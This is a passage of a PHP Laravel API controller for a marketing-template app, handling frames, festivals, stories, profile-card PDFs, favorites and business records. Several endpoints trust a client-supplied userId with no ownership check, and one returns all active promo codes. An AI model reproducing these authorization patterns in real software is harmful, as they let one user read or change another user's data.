                $preview_img = Storage::disk('spaces')->url('uploads/template/'.$zip_name.'/preview.jpg');
            } else {
                $dir = public_path('uploads/template/'.$zip_name.'/');
                if (is_dir($dir)) {
                    if (file_exists($dir.'preview.jpg')) {
                        $preview_img = asset('uploads/template/'.$zip_name.'/preview.jpg');
                    } elseif (file_exists($dir.'preview.png')) {
                        $preview_img = asset('uploads/template/'.$zip_name.'/preview.png');
                    } else {
                        $files = glob($dir . '*.{jpg,jpeg,png}', GLOB_BRACE);
                        if (!empty($files)) {
                            $preview_img = asset('uploads/template/'.$zip_name.'/'.basename($files[0]));
                        }
                    }
                }
            }

            $sanctumId = null;
            try { $sanctumId = auth('sanctum')->id(); } catch (\Exception $e) {}
            $userId = $sanctumId ?? request('userId') ?? request('user_id');

            if ($userId && !empty($json_data)) {
                $parsedJson = json_decode($json_data, true);
                $jsonModified = false;
                
                if ($parsedJson) {
                    $newJson = $this->injectDynamicBackgroundImageArray($parsedJson, $userId);
                    if ($newJson !== $parsedJson) {
                        $parsedJson = $newJson;
                        $jsonModified = true;
                    }
                    
                    $aiContent = \App\Models\UserCustomFrameContent::where('user_id', $userId)
                        ->where('business_custom_frame_id', $frame->id)
                        ->first();
                        
                    if ($aiContent && !empty($aiContent->generated_content) && isset($parsedJson['layers'])) {
                        foreach ($parsedJson['layers'] as &$layer) {
                            if (isset($layer['type']) && $layer['type'] === 'text' && isset($layer['name'])) {
                                if (isset($aiContent->generated_content[$layer['name']])) {
                                    $layer['text'] = $aiContent->generated_content[$layer['name']];
                                    $jsonModified = true;
                                }
                            }
                        }
                    }
                    
                    if ($jsonModified) {
                        $json_data = json_encode($parsedJson);
                    }
                }
            }

            $posts[] = array(
                "postId" => ($c ? $c->name : "")."".$frame->id,
                "id" => $frame->id,
                "type" => "business_custom_frame",
                "is_template" => true,
                "language" => "All",
                "image" => $preview_img,
                "is_paid" => false,
                "height" => $frame->height ?? 1080,
                "width" => $frame->width ?? 1080,
                "image_type" => $frame->imageType->name ?? "square",
                "aspect_ratio" => $frame->aspect_ratio ?? "1:1",
                "name" => ($zip_name)?$zip_name:"",
                "json" => ($zip_name)?$json_data:"",
                "templateBaseUrl" => ($zip_name)?$this->getTemplateBaseUrl($zip_name):"",
                "render_version" => $frame->render_version ?? 1,
                "updated_at" => $frame->updated_at?->toIso8601String() ?? null,
                "tags" => $frame->tags ?? [],
                "created_at" => $frame->created_at ? $frame->created_at->toISOString() : null,
            );
        }

        return response()->json([
            'success' => true,
            'data' => $posts,
            'current_page' => $custom_frame_paginator->currentPage(),
            'last_page' => $custom_frame_paginator->lastPage(),
        ]);
    }

    public function getCategory()
    {
        $category = Category::where('status',1)->orderBy(ApiSetting::getApiSetting("category_order_type"),ApiSetting::getApiSetting("category_order_by"))->get();

        if(!$category->isEmpty())
        {
            $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';
            // Batch-load all video checks in one query
            $categoryIds = $category->pluck('id')->toArray();
            $videoCategoryIds = Video::where("type","category")->whereIn("category_id", $categoryIds)->distinct()->pluck('category_id')->toArray();

            foreach ($category as $cat) {
                $data[] = array(
                    "categoryId" => $cat->id,
                    "categoryName" => $cat->name,
                    "categoryIcon" => $isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon),
                    "video" => in_array($cat->id, $videoCategoryIds),
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function profile_card_image_upload(Request $request)
    {
        $request->validate([
            'profile_image' => ['required', 'image', 'mimes:jpg,jpeg,png,webp', 'max:5120'],
        ]);

        if(StorageSetting::getStorageSetting("storage") == "DigitalOcean")
        {
            $image = $request->file('profile_image');
            $fileName = Str::uuid().'.'.$image->extension();
    
            $path = Storage::disk('spaces')->put('uploads/'.$fileName, file_get_contents($image),'public');
        }
        else
        {
            $destinationPath = public_path('uploads');
            $extension = $request->file("profile_image")->extension();
            $fileName = Str::uuid() . '.' . $extension;
            $request->file("profile_image")->move($destinationPath, $fileName);
        }

        if(isset($fileName))
        {
            return response()->json([
                'url' => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$fileName):asset('uploads/'.$fileName),
            ], 200);
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "Image Upload Failed!",
            ], 404);
        }
    }

    public function business_card_list()
    {
        $card = BusinessCard::where('status',1)->get();
        foreach($card as $c)
        {
            $data[] = array(
                "cardId" => $c->id,
                "cardName" => $c->name,
                "cardImage" => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$c->image):asset('uploads/'.$c->image),
            );
        }
        return $data;
    }

    public function profile_card(Request $request)
    {
        $data = [
            'image' => ($request->image)?$request->image:"",
            'name'    => ($request->name)?$request->name:"",
            'designation'    => ($request->designation)?$request->designation:"",
            'email'    => ($request->email)?$request->email:"",
            'address'    => ($request->address)?$request->address:"",
            'phone'    => ($request->phone)?$request->phone:"",
            'website'    => ($request->website)?$request->website:"",
            'twitter'    => ($request->twitter)?$request->twitter:"",
            'facebook'    => ($request->facebook)?$request->facebook:"",
            'whatsapp'    => ($request->whatsapp)?$request->whatsapp:"",
            'linkedin'    => ($request->linkedin)?$request->linkedin:"",
            'about_us' => ($request->about_us)?$request->about_us:"",
            'comapany_name' => ($request->comapany_name)?$request->comapany_name:"",
            'instagram' => ($request->instagram)?$request->instagram:"",
            'youtube' => ($request->youtube)?$request->youtube:"",
        ];

        $pdf_file_name = $request->template."_".str_replace(" ","_",strtolower($request->name));
        $height = round(strlen($data['about_us'])/60);
        $address_line = ceil(strlen($data['address'])/60);
        $count = ($address_line == 1)?0:$address_line*8;

        if($request->template == "vCard1")
        {
            $customPaper = array(35,-50,360+$height*17+$count,375);
        }
        elseif($request->template == "vCard2")
        {
            $customPaper = array(0,0,398+($height*18)+(($address_line == 1)?0:$address_line*15),375);
        }
        elseif($request->template == "vCard3")
        {
            $customPaper = array(0,0,650+(ceil(strlen($data['about_us'])/65))*18+(($address_line == 1)?0:$address_line*4),375);
        }
        elseif($request->template == "vCard4")
        {
            $customPaper = array(35,-50,660,439);
        }
        elseif($request->template == "vCard5")
        {
            $customPaper = array(0,0,520+$height*17+$count,375);
        }
        elseif($request->template == "vCard6")
        {
            $customPaper = array(0,0,505+$height*17+$count,375);
        }
        elseif($request->template == "vCard7")
        {
            $customPaper = array(0,0,415+$height*17+$count,375);
        }
        elseif($request->template == "vCard8")
        {
            $customPaper = array(0,0,550+$height*17,375);
        }
        elseif($request->template == "vCard9")
        {
            $customPaper = array(0,0,575+$height*17+(($address_line == 1)?0:$address_line*3),375);
        }
        elseif($request->template == "vCard10")
        {
            $customPaper = array(0,0,550+$height*17,375);
        }

        if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean')
        {
            $all = Storage::disk('spaces')->allFiles('uploads/pdf/');
            foreach($all as $a)
            {
                $filelastmodified = Storage::disk('spaces')->lastModified($a);
                if((time() - $filelastmodified) > 24*3600)
                {
                    Storage::disk('spaces')->delete($a);
                }
            }
        }
        else
        {
            $path = './uploads/pdf/';

            if ($handle = opendir($path)) {
                while (false !== ($file = readdir($handle))) { 
                    if ($file != "." && $file != "..") {
                        $filelastmodified = filemtime($path . $file);
                        //24 hours in a day * 3600 seconds per hour
                        if((time() - $filelastmodified) > 24*3600)
                        {
                            unlink($path . $file);
                        }
                    }

                }
                closedir($handle); 
            }
        }

        $pdf = PDF::loadView('template.'.$request->template,$data)->setPaper($customPaper, 'landscape');
        $random = Str::random(10);

        if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean')
        {
            Storage::disk('spaces')->delete('/uploads/pdf/'.$random.'.pdf');
        }
        else
        {
            if (File::exists('./uploads/pdf/'.$random.'.pdf')) {
                File::delete('./uploads/pdf/'.$random.'.pdf');
            }
        }
        
        if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean')
        {
            Storage::disk('spaces')->put("uploads/pdf/".$random.".pdf", $pdf->output(),'public');
        }
        else
        {
            file_put_contents("./uploads/pdf/".$random.".pdf", $pdf->output());
        }

        return response()->json([
            'url' => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/pdf/'.$random.'.pdf'):asset('uploads/pdf/'.$random.'.pdf'),
        ], 200);
    }

    public function getPromocodes(Request $request)
    {
        return response()->json([
            'promocodes' => \App\Models\CouponCode::where('status', 1)->get()
        ], 200);
    }

    public function userFavoriteFrame(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'userId' => 'required',
            'frameId' => 'required',
        ]);

        if ($validation->fails()) {
            return response()->json(['success' => false, 'message' => 'Missing required fields'], 400);
        }

        $userId = $request->get('userId');
        $frameId = $request->get('frameId');

        $existing = \App\Models\UserFavoriteFrame::where('user_id', $userId)->where('frame_identifier', $frameId)->first();

        if ($existing) {
            $existing->delete();
            return response()->json(['success' => true, 'action' => 'removed']);
        } else {
            \App\Models\UserFavoriteFrame::create([
                'user_id' => $userId,
                'frame_identifier' => $frameId
            ]);
            return response()->json(['success' => true, 'action' => 'added']);
        }
    }

    public function userFavorites(Request $request)
    {
        $userId = $request->get('userId');
        if (!$userId) {
            return response()->json(['success' => false, 'message' => 'User ID required'], 400);
        }
        $favorites = \App\Models\UserFavoriteFrame::where('user_id', $userId)->pluck('frame_identifier');
        return response()->json(['success' => true, 'data' => $favorites]);
    }

    public function getStory()
    {
        $story = Story::where('status',1)->orderBy("id","desc")->get();
        
        if(!$story->isEmpty())
        {
            $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';

            // Preload all related data in batch (eliminates 5N queries)
            $festivalIds = $story->pluck('festival_id')->filter()->unique()->toArray();
            $categoryIds = $story->pluck('category_id')->filter()->unique()->toArray();
            $subIds = $story->pluck('subscription_id')->filter()->unique()->toArray();
            $customIds = $story->pluck('custom_category_id')->filter()->unique()->toArray();

            $festivals = Festivals::whereIn('id', $festivalIds)->get()->keyBy('id');
            $categories = Category::whereIn('id', $categoryIds)->get()->keyBy('id');
            $subscriptions = Subscription::whereIn('id', $subIds)->get()->keyBy('id');
            $customs = CustomPost::whereIn('id', $customIds)->get()->keyBy('id');

            foreach ($story as $s) {
                $festival = $festivals->get($s->festival_id);
                $category = $categories->get($s->category_id);
                $subscription = $subscriptions->get($s->subscription_id);
                $custom = $customs->get($s->custom_category_id);

                $id = "";
                $name = "";

                if(!empty($festival))
                {
                    $id = $festival->id;
                    $name = $festival->title;
                }

                if(!empty($custom))
                {
                    $id = $custom->id;
                    $name = $custom->name;
                }

                if(!empty($category))
                {
                    $id = $category->id;
                    $name = $category->name;
                }

                if(!empty($subscription))
                {
                    $id = $subscription->id;
                    $name = $subscription->plan_name;
                }

                $data[] = array(
                    "storyId" => $s->id,
                    "storyType" => $s->story_type,
                    "image" => $isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$s->image):asset('uploads/'.$s->image),
                    "id" => $id,
                    "name" => ($name)?$name: $s->external_link_title,
                    "externalLink"=> $s->external_link,
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getFestival(Request $request)
    {
        $query = Festivals::where('status',1)
                    ->where('activation_date',"<=",date("Y-m-d",strtotime('today')));
        
        if ($request->has('date') && !empty($request->date)) {
            $query->whereDate('festivals_date', date('Y-m-d', strtotime($request->date)));
        } else {
            $query->whereDate('festivals_date', ">=", date("Y-m-d",strtotime('today')));
        }

        $festival = $query->orderBy(ApiSetting::getApiSetting("festival_order_type"),ApiSetting::getApiSetting("festival_order_by"))->get();
       
        if(!$festival->isEmpty())
        {
            $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';
            // Batch-load all video checks in one query
            $festivalIds = $festival->pluck('id')->toArray();
            $videoFestivalIds = Video::where("type","festival")->whereIn("festival_id", $festivalIds)->distinct()->pluck('festival_id')->toArray();

            $data = [];
            foreach ($festival as $f) {
                $data[] = array(
                    "festivalId" => $f->id,
                    "festivalTitle" => $f->title,
                    "festivalImage" => ($f->image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$f->image):asset('uploads/'.$f->image)):"",
                    "festivalDate" => date_format(date_create(implode("", preg_split("/[-\s:,]/",$f->festivals_date))),"d M, y"),
                    "activationDate" => date_format(date_create(implode("", preg_split("/[-\s:,]/",$f->activation_date))),"d M, y"),
                    "isActive" => ($f->activation_date <= date("Y-m-d",strtotime('today')))?true:false,
                    "video" => in_array($f->id, $videoFestivalIds),
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getNews()
    {
        $news = News::orderBy(ApiSetting::getApiSetting("news_order_type"),ApiSetting::getApiSetting("news_order_by"))->get();
    
        if(!$news->isEmpty())
        {
            foreach ($news as $n) {
                $data[] = array(
                    "id" => $n->id,
                    "title" => $n->title,
                    "description" => $n->description,
                    "image" => ($n->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$n->image):asset('uploads/'.$n->image)):"",
                    "date" => date('d M, y',strtotime($n->date))
                );
            }
            return $data;
        }
        else
        {
            return $data = array();
        }
    }

    public function personal()
    {
        $data = [];
        $festival = Festivals::whereBetween('festivals_date',[date('Y-m-d',strtotime('today')),date('Y-m-d',strtotime('+1 days'))])->where('status',1)->get();
        $feature_festival = FeaturePost::where('type',"festival")->get();
        $feature_category = FeaturePost::where('type',"category")->get();

        foreach ($festival as $f) {
            $data[] = array(
                "id" => $f->id,
                "name" => $f->title,
                "type" => "festival"
            );
        }

        foreach ($feature_festival as $ff) {
            $festival = Festivals::find($ff->festival_id);
            if($festival && $festival->festivals_date > date("Y-m-d",strtotime('+1 days')))
            {
                $data[] = array(
                    "id" => $festival->id,
                    "name" => $festival->title,
                    "type" => "festival"
                );
            }
        }

        foreach ($feature_category as $fc) {
            $category = Category::find($fc->category_id);
            $data[] = array(
                "id" => $category->id,
                "name" => $category->name,
                "type" => "category"
            );
        }

        return $data;
    }

    public function search(Request $request)
    {
        $data = [];
        $festival = Festivals::where("title",'Like', '%'.$request->term.'%')->where('status',1)->get();
        $category = Category::where("name",'Like', '%'.$request->term.'%')->where('status',1)->get();
        $custom_post = CustomPost::where("name",'Like', '%'.$request->term.'%')->where('status',1)->get();
        $business_category = BusinessCategory::where("name",'Like', '%'.$request->term.'%')->where('status',1)->get();

        foreach($festival as $fest) 
        {
            $festivalPost = FestivalsPost::where("festivals_id",$fest->id)->where('status',1)->inRandomOrder()->get();
                    
            foreach ($festivalPost as $f) 
            {
                $data[] = array(
                    "postId" => $f->festivals->title."".$f->id,
                    "id" => $f->festivals_id,
                    "type" => "festival",
                    "language" => $f->language->title,
                    "image" => ($f->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$f->frame_image):asset('uploads/'.$f->frame_image)):"",
                    "is_paid" => ($f->paid==1)?true:false,
                    "height" => $f->height,
                    "width" => $f->width,
                    "image_type" => $f->image_type,
                    "aspect_ratio" => $f->aspect_ratio,
                );
            }
        }

        foreach($category as $cat) 
        {
            $categoryPost = CategoryPost::where("category_id",$cat->id)->where('status',1)->inRandomOrder()->get();
                    
            foreach ($categoryPost as $c) 
            {
                $data[] = array(
                    "postId" => $c->category->name."".$c->id,
                    "id" => $c->category_id,
                    "type" => "category",
                    "language" => $c->language->title,
                    "image" => ($c->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$c->frame_image):asset('uploads/'.$c->frame_image)):"",
                    "is_paid" => ($c->paid==1)?true:false,
                    "height" => $c->height,
                    "width" => $c->width,
                    "image_type" => $c->image_type,
                    "aspect_ratio" => $c->aspect_ratio,
                );
            }
        }

        foreach($custom_post as $custom)
        {
            $customPostFrame = CustomPostFrame::where("custom_post_id",$custom->id)->where('status',1)->inRandomOrder()->get();
                    
            foreach ($customPostFrame as $c) 
            {
                if($c->zip_name)
                {
                    $json_data = $this->resolveTemplateJson($c->zip_name, null, 'custom') ?? '';
                }

                $image_val = ($c->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$c->frame_image):asset('uploads/'.$c->frame_image)):"";
                if(empty($image_val) && $c->zip_name) {
                    if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean') {
                        $image_val = Storage::disk('spaces')->url('uploads/template/'.$c->zip_name.'/preview.jpg');
                    } else {
                        if(file_exists('./uploads/template/'.$c->zip_name.'/preview.jpg')) {
                            $image_val = asset('uploads/template/'.$c->zip_name.'/preview.jpg');
                        }
                    }
                }

                $data[] = array(
                    "postId" => $c->custom_post->name."".$c->id,
                    "id" => $c->custom_post_id,
                    "type" => "custom ".$c->custom_frame_type,
                    "is_template" => true,
                    "language" => $c->language->title,
                    "image" => $image_val,
                    "is_paid" => ($c->paid==1)?true:false,
                    "height" => $c->height,
                    "width" => $c->width,
                    "image_type" => $c->image_type,
                    "aspect_ratio" => $c->aspect_ratio,
                    "name" => ($c->zip_name)?$c->zip_name:"",
                    "json" => ($c->zip_name)?$json_data:"",
                    "templateBaseUrl" => ($c->zip_name)?$this->getTemplateBaseUrl($c->zip_name):"",
                    "render_version" => $c->render_version ?? 1,
                    "updated_at" => $c->updated_at?->toIso8601String() ?? null,
                );
            }
        }

        foreach($business_category as $business)
        {
            $businessFrame = BusinessFrame::where("business_category_id",$business->id)->where('status',1)->inRandomOrder()->get();
            
            $userId = $request->userId ?? (auth('sanctum')->id() ?? auth()->id());
            if ($userId) {
                $userBusiness = \App\Models\Business::where('user_id', $userId)->where('is_default', 1)->first() 
                             ?? \App\Models\Business::where('user_id', $userId)->first();
                if ($userBusiness) {
                    $mainController = app(\App\Http\Controllers\MainController::class);
                    $businessFrame = $mainController->filterFramesByBusinessData($businessFrame, $userBusiness);
                }
            }
                    
            foreach ($businessFrame as $frame) 
            {
                $data[] = array(
                    "postId" => $frame->business_category->name."".$frame->id,
                    "id" => $frame->business_category_id,
                    "type" => "business",
                    "image" => ($frame->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$frame->frame_image):asset('uploads/'.$frame->frame_image)):"",
                    "is_paid" => ($frame->paid==1)?true:false,
                    "height" => $frame->height,
                    "width" => $frame->width,
                    "image_type" => $frame->image_type,
                    "aspect_ratio" => $frame->aspect_ratio,
                );
            }
        }

        return $data;
    }

    public function getBusiness(Request $request)
    {
        $userId = $request->userId ?? (auth('sanctum')->id() ?? auth()->id());
        $business = Business::where('user_id', $userId)
            ->where('status',1)
            ->orderBy('is_default', 'DESC')
            ->orderBy('id', 'ASC')
            ->get();

        if(!$business->isEmpty())
        {
            foreach ($business as $b) {
                $category = BusinessCategory::find($b->business_category_id);
                $products = [];
                foreach(\App\Models\BusinessProductMapping::where('business_id', $b->id)->with('product')->get() as $mapping) {
                    if ($mapping->product) {
                        $products[] = [
                            'id' => $mapping->product->id,
                            'name' => $mapping->product->name,
                        ];
                    }
                }
                
                $pendingProducts = [];
                foreach(\App\Models\BusinessProductRequest::where('business_id', $b->id)->whereIn('status', ['pending', 'approved'])->get() as $req) {
                    $pendingProducts[] = [
                        'id' => $req->id,
                        'name' => $req->requested_name,
                        'status' => $req->status,
                        'resolved_product_id' => $req->resolved_product_id
                    ];
                }

                $data[] = array(
                    "id" => $b->id,
                    "name" => $b->name,
                    "email" => $b->email,
                    "logo" => $this->businessLogoUrl($b->logo),
                    "mobileNo" => $b->mobile_no,
                    "website" => $b->website,
                    "address" => $b->address,
                    "businessCategory" => array(
                        "businessCategoryId" => ($category)?$category->id:"",
                        "businessCategoryName" => ($category)?$category->name:"",
                        "businessCategoryIcon" => ($category)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$category->icon):asset('uploads/'.$category->icon)):"",
                    ),
                    "isDefault" => ($b->is_default == 1)?true:false,
                    "extra_emails" => $b->extra_emails ?? [],
                    "extra_mobile_numbers" => $b->extra_mobile_numbers ?? [],
                    "extra_websites" => $b->extra_websites ?? [],
                    "extra_addresses" => $b->extra_addresses ?? [],
                    "hidden_frame_fields" => $b->hidden_frame_fields ?? [],
                    "business_category_id" => $b->business_category_id,
                    "business_sub_category_ids" => $b->sub_categories()->pluck('business_sub_category_id')->toArray() ?? [],
                    "business_type_id" => $b->business_type_id,
                    "business_type_ids" => $b->types()->pluck('business_type_id')->toArray() ?? [],
                    "products" => $products,
                    "pendingCustomProducts" => $pendingProducts,
                );
            }
        }
        else
        {
            return $data = array();
        }
        
        return $data;
    }

    public function addBusiness(Request $request)
    {
        $authenticatedUser = auth('sanctum')->user();
        if (!$authenticatedUser) {
            return response()->json(['status' => 'Error', 'message' => 'Authentication is required.'], 401);
        }
        $request->merge(['userId' => $authenticatedUser->id]);

        $validation = Validator::make($request->all(), [
            'userId' => 'required',
            'businessCategoryId' => 'nullable',
            'bussinessName' => 'required',
            "bussinessNumber" => 'required',
            'bussinessEmail' => 'required|email|unique:business,email',
            "bussinessImage" => "nullable|mimes:jpg,png,jpeg",
            "bussinessWebsite" => 'required',
            "bussinessAddress" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else {
            $business_data = Business::where('user_id',$request->get("userId"))->where('is_default',1)->get();
            if(!$business_data->isEmpty())
            {
                foreach ($business_data as $value){
                    $b = Business::find($value->id);
                    $b->is_default = 0;
                    $b->save();
                }
            }

            $id = Business::create([
                "name" => $request->get("bussinessName"),
                "email" => $request->get("bussinessEmail"),
                "mobile_no" => $request->get("bussinessNumber"),
                "address" => $request->get("bussinessAddress"),
                "website" => $request->get("bussinessWebsite"),
                "user_id" => $request->get("userId"),
                "business_category_id" => $request->get("businessCategoryId"),
                "business_type_id" => $request->get("businessTypeId"),
                "is_default" => 1,
                "extra_emails" => $request->has('extra_emails') ? (is_string($request->get('extra_emails')) ? json_decode($request->get('extra_emails'), true) : $request->get('extra_emails')) : null,
                "extra_mobile_numbers" => $request->has('extra_mobile_numbers') ? (is_string($request->get('extra_mobile_numbers')) ? json_decode($request->get('extra_mobile_numbers'), true) : $request->get('extra_mobile_numbers')) : null,
                "extra_websites" => $request->has('extra_websites') ? (is_string($request->get('extra_websites')) ? json_decode($request->get('extra_websites'), true) : $request->get('extra_websites')) : null,
                "extra_addresses" => $request->has('extra_addresses') ? (is_string($request->get('extra_addresses')) ? json_decode($request->get('extra_addresses'), true) : $request->get('extra_addresses')) : null,
                "hidden_frame_fields" => $request->has('hidden_frame_fields') ? (is_string($request->get('hidden_frame_fields')) ? json_decode($request->get('hidden_frame_fields'), true) : $request->get('hidden_frame_fields')) : null,
            ])->id;

            $businessUpdate = Business::find($id);

            // Handle sub category ids if passed
            if($request->get('businessSubCategoryIds')) {
                $subCatIds = $request->get('businessSubCategoryIds');
                if(is_string($subCatIds)) {
                    $subCatIds = json_decode($subCatIds, true) ?? explode(',', $subCatIds);
                }
                if (is_array($subCatIds)) {
                    $businessUpdate->sub_categories()->sync(array_filter($subCatIds));
                    // Keep JSON array for legacy backwards compatibility just in case
                    $businessUpdate->business_sub_category_ids = array_filter($subCatIds);
                }
            }

            // Handle business type ids if passed
            if($request->get('businessTypeIds')) {
                $typeIds = $request->get('businessTypeIds');
                if(is_string($typeIds)) {
                    $typeIds = json_decode($typeIds, true) ?? explode(',', $typeIds);
                }
                if (is_array($typeIds)) {
                    $businessUpdate->types()->sync(array_filter($typeIds));
                }
            }
            
            $businessUpdate->save();

            $productIds = $request->get('product_ids');
            if ($productIds) {
                if (is_string($productIds)) {
                    $productIds = json_decode($productIds, true) ?? explode(',', $productIds);
                }
                if (is_array($productIds)) {
                    foreach ($productIds as $pId) {
                        if($pId) {
                            \App\Models\BusinessProductMapping::create(['business_id' => $id, 'business_product_id' => $pId]);
                        }
                    }
                }
            }

            if(StorageSetting::getStorageSetting("storage") == "DigitalOcean")
            {
                if ($request->file("bussinessImage") && $request->file('bussinessImage')->isValid()) {
                    $image = $request->file('bussinessImage');
                    $file = Str::uuid().'.'.$image->getClientOriginalExtension();
            
                    $path = Storage::disk('spaces')->put('uploads/'.$file, file_get_contents($image),'public');
                    
                    $user = Business::find($id);
                    $user->logo = $file;
                    $user->save();
                }
            }
            else
            {
                if ($request->file("bussinessImage") && $request->file('bussinessImage')->isValid()) {
                    $this->upload_image($request->file("bussinessImage"),"logo", $id);
                }
            }

            $business = Business::where('user_id',$request->userId)->get();

            foreach ($business as $b) {
                $category = BusinessCategory::find($b->business_category_id);
                $products = [];
                foreach(\App\Models\BusinessProductMapping::where('business_id', $b->id)->with('product')->get() as $mapping) {
                    if ($mapping->product) {
                        $products[] = [
                            'id' => $mapping->product->id,
                            'name' => $mapping->product->name,
                        ];
                    }
                }
                
                $pendingProducts = [];
                foreach(\App\Models\BusinessProductRequest::where('business_id', $b->id)->whereIn('status', ['pending', 'approved'])->get() as $req) {
                    $pendingProducts[] = [
                        'id' => $req->id,
                        'name' => $req->requested_name,
                        'status' => $req->status,
                        'resolved_product_id' => $req->resolved_product_id
                    ];
                }

                $data[] = array(
                    "id" => $b->id,
                    "name" => $b->name,
                    "email" => $b->email,
                    "logo" => $this->businessLogoUrl($b->logo),
                    "mobileNo" => $b->mobile_no,
                    "website" => $b->website,
                    "address" => $b->address,
                    "businessCategory" => array(
                        "businessCategoryId" => ($category)?$category->id:"",
                        "businessCategoryName" => ($category)?$category->name:"",
                        "businessCategoryIcon" => ($category)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$category->icon):asset('uploads/'.$category->icon)):"",
                    ),
                    "isDefault" => ($b->is_default == 1)?true:false,
                    "hidden_frame_fields" => $b->hidden_frame_fields ?? [],
                    "business_category_id" => $b->business_category_id,
                    "business_sub_category_ids" => $b->sub_categories()->pluck('business_sub_category_id')->toArray() ?? [],
                    "business_type_id" => $b->business_type_id,
                    "business_type_ids" => $b->types()->pluck('business_type_id')->toArray() ?? [],
                    "products" => $products,
                    "pendingCustomProducts" => $pendingProducts,
                );
            }

            return $data;
        }
    }

    public function updateBusiness(Request $request)
    {
        $authenticatedUser = auth('sanctum')->user();
        if (!$authenticatedUser) {
            return response()->json(['status' => 'Error', 'message' => 'Authentication is required.'], 401);
        }

        $validation = Validator::make($request->all(), [
            'bussinessName' => 'required',
            "bussinessNumber" => 'required',
            'bussinessEmail' => 'required|email|unique:business,email,' . $request->input("bussinessId"),
            "bussinessImage" => "nullable|mimes:jpg,png,jpeg",
            "bussinessWebsite" => 'required',
            "bussinessAddress" => 'required',
            'businessCategoryId' => 'nullable',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } else {

            $business = Business::whereId($request->get("bussinessId"))
                ->where('user_id', $authenticatedUser->id)
                ->first();
            if (!$business) {
                return response()->json(['status' => 'Error', 'message' => ['Business not found']], 404);
            }
            $business->name = $request->get("bussinessName");
            $business->email = $request->get("bussinessEmail");
            $business->mobile_no = $request->get("bussinessNumber");
            $business->website = $request->get("bussinessWebsite");
            $business->address = $request->get("bussinessAddress");
            // Only update category if provided, otherwise keep existing
            if ($request->filled('businessCategoryId')) {
                $business->business_category_id = $request->get("businessCategoryId");
            }
            if ($request->filled('businessTypeId')) {
                $business->business_type_id = $request->get("businessTypeId");
            }
            if ($request->filled('businessSubCategoryIds')) {
                $subCatIds = $request->get('businessSubCategoryIds');
                if(is_string($subCatIds)) {
                    $subCatIds = json_decode($subCatIds, true) ?? explode(',', $subCatIds);
                }
                if (is_array($subCatIds)) {
                    $business->sub_categories()->sync(array_filter($subCatIds));
                    // Keep JSON array for legacy backwards compatibility just in case
                    $business->business_sub_category_ids = array_filter($subCatIds);
                }
            }
            if ($request->filled('businessTypeIds')) {
                $typeIds = $request->get('businessTypeIds');
                if(is_string($typeIds)) {
                    $typeIds = json_decode($typeIds, true) ?? explode(',', $typeIds);
                }
                if (is_array($typeIds)) {
                    $business->types()->sync(array_filter($typeIds));
                }
            }
            if ($request->has('extra_emails')) {
                $business->extra_emails = is_string($request->get('extra_emails')) ? json_decode($request->get('extra_emails'), true) : $request->get('extra_emails');
            }
            if ($request->has('extra_mobile_numbers')) {
                $business->extra_mobile_numbers = is_string($request->get('extra_mobile_numbers')) ? json_decode($request->get('extra_mobile_numbers'), true) : $request->get('extra_mobile_numbers');
            }
            if ($request->has('extra_websites')) {
                $business->extra_websites = is_string($request->get('extra_websites')) ? json_decode($request->get('extra_websites'), true) : $request->get('extra_websites');
            }
            if ($request->has('extra_addresses')) {
                $business->extra_addresses = is_string($request->get('extra_addresses')) ? json_decode($request->get('extra_addresses'), true) : $request->get('extra_addresses');
            }
            if ($request->has('hidden_frame_fields')) {
                $business->hidden_frame_fields = is_string($request->get('hidden_frame_fields')) ? json_decode($request->get('hidden_frame_fields'), true) : $request->get('hidden_frame_fields');
            }
            $business->save();

            if ($request->has('product_ids')) {
                $productIds = $request->get('product_ids');
                if (is_string($productIds)) {
                    $productIds = json_decode($productIds, true) ?? explode(',', $productIds);
                }
                if (is_array($productIds)) {
                    \App\Models\BusinessProductMapping::where('business_id', $business->id)->delete();
                    foreach ($productIds as $pId) {
                        if($pId) {
